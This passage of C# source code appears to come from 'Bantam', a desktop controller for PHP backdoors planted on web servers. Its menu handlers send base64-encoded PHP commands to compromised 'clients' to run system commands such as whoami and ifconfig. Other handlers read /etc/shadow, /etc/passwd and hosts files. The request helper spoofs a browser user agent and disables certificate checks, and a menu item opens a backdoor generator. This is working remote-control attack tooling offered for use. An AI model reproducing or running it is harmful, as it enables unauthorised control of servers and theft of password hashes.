            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows)
            {
                string code = "@system('ver');";
                startRichTextBoxThread(code, "ver");
            }
            else
            {
                MessageBox.Show("This client is linux!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows == false)
            {
                string code = "@system('whoami');";
                startRichTextBoxThread(code, "whoami");
            }
            else
            {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows == false)
            {
                string code = "@system('ifconfig');";
                startRichTextBoxThread(code, "ifconfig");
            }
            else
            {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        #endregion

        #region READ_COMMON_FILES
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsHostsMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows)
            {
                string code = "echo @is_readable('C:\\Windows\\System32\\drivers\\etc\\hosts') ? file_get_contents('C:\\Windows\\System32\\drivers\\etc\\hosts') : 'File Not Readable';";
                startRichTextBoxThread(code, "hosts");
            }
            else
            {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows == false)
            {
                string code = "echo @is_readable('/etc/network/interfaces') ? file_get_contents('/etc/network/interfaces') : 'File Not Readable';";
                startRichTextBoxThread(code, "interfaces");
            }
            else
            {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linusVersionMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows == false)
            {
                string code = "echo @is_readable('/proc/version') ? file_get_contents('/proc/version') : 'File Not Readable';";
                startRichTextBoxThread(code, "version");
            }
            else
            {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxHostsMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows == false)
            {
                string code = "echo @is_readable('/etc/hosts') ? file_get_contents('/etc/hosts') : 'File Not Readable';";
                startRichTextBoxThread(code, "hosts");
            }
            else
            {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows == false)
            {
                string code = "echo @is_readable('/etc/issue.net') ? file_get_contents('/etc/issue.net') : 'File Not Readable';";
                startRichTextBoxThread(code, "issue.net");
            }
            else
            {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void shadowToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows == false)
            {
                string code = "echo @is_readable('/etc/shadow') ? file_get_contents('/etc/shadow') : 'File Not Readable';";
                startRichTextBoxThread(code, "shadow");
            }
            else
            {
                MessageBox.Show("This Target does not have a shadow file (derp)", "You TARD");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void passwdToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[target].Windows == false)
            {
                string code = "echo @is_readable('/etc/passwd') ? file_get_contents('/etc/passwd') : 'File Not Readable';";
                startRichTextBoxThread(code, "passwd");
            }
            else
            {
                MessageBox.Show("This Target does not have a passwd file (derp)");
            }
        }

        #endregion

        #region WEB_REQUEST_FUNCTIONS

        //TODO socks5 doesnt work
        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <param name="postData"></param>
        /// <returns></returns>
        public string makeRequest(string url, string postData)
        {
            try
            {
                var request = (HttpWebRequest)WebRequest.Create(url);
                var data = Encoding.ASCII.GetBytes(postData);

                request.Method = "POST";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = data.Length;
                request.Timeout = 6_000;

                //disable SSL verification
                request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                var response = (HttpWebResponse)request.GetResponse();

                if (response != null)
                {
                    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                    return (string)responseString;
                }
                return "";
            }
            catch (Exception ex)
            {
                
                //if this borkes, you can probably mark client as red/strikethrough text (possibly remove)
                //MessageBox.Show(url + " is down.");
            }
            return "";
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <param name="code"></param>
        /// <returns></returns>
        public string executePHP(string url, string code)
        {
            //remove extra spaces, line breakes, tabs, whitespace, urlendcode then base64 encode
            string minifiedCode = PHP_Helper.minifyCode(code);
            string encodedCode = HttpUtility.UrlEncode(minifiedCode);
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(encodedCode);
            string b64 = System.Convert.ToBase64String(plainTextBytes);

            var postData = "command=" + b64;
            return makeRequest(url, postData);
        }

        #endregion

        private void BantamMain_Load(object sender, EventArgs e)
        {

        }

        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
            backdoorGenerator.Show();
        }
    }
}
